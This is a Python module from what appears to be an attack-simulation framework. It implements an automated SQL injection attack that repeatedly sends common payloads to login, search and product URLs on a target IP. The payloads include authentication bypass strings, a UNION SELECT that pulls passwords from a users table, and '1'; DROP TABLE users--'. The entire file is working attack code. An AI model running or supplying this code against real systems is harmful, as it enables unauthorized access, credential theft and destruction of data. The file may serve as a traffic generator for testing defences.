"""SQL Injection attack implementation"""

import asyncio
import aiohttp
import logging
import urllib.parse
from .base_attack import BaseAttack

logger = logging.getLogger(__name__)


class SQLInjection(BaseAttack):
    """SQL Injection attack"""
    
    def get_attack_type(self) -> str:
        return "SQL Injection"
    
    def get_default_port(self) -> int:
        return 80
    
    async def _try_sql_injection(self, session, payload):
        """Try SQL injection payload"""
        port = self.target_port or self.get_default_port()
        
        # Try different injection points
        urls = [
            f"http://{self.target_ip}:{port}/login?user={urllib.parse.quote(payload)}&pass=test",
            f"http://{self.target_ip}:{port}/search?id={urllib.parse.quote(payload)}",
            f"http://{self.target_ip}:{port}/product?id={urllib.parse.quote(payload)}"
        ]
        
        for url in urls:
            try:
                async with session.get(url, timeout=5) as response:
                    await response.read()
                    self.packets_sent += 1
            except Exception:
                pass
    
    async def _execute_attack(self):
        """Execute SQL injection attack"""
        duration = self.parameters.get('duration', 300)
        
        # Common SQL injection payloads
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' --",
            "' UNION SELECT NULL--",
            "1' AND 1=1--",
            "' OR 'a'='a",
            "1'; DROP TABLE users--",
            "' UNION SELECT password FROM users--"
        ]
        
        logger.info(f"SQL-Injection: Starting attack on {self.target_ip}")
        
        async with aiohttp.ClientSession() as session:
            start_time = asyncio.get_event_loop().time()
            
            while (asyncio.get_event_loop().time() - start_time) < duration:
                tasks = [self._try_sql_injection(session, payload) for payload in payloads]
                await asyncio.gather(*tasks, return_exceptions=True)
                
                if self.packets_sent % 100 == 0:
                    logger.info(f"SQL-Injection: {self.packets_sent} attempts")
                
                await asyncio.sleep(1)
        
        logger.info(f"SQL-Injection: Attack complete. Total attempts: {self.packets_sent}")

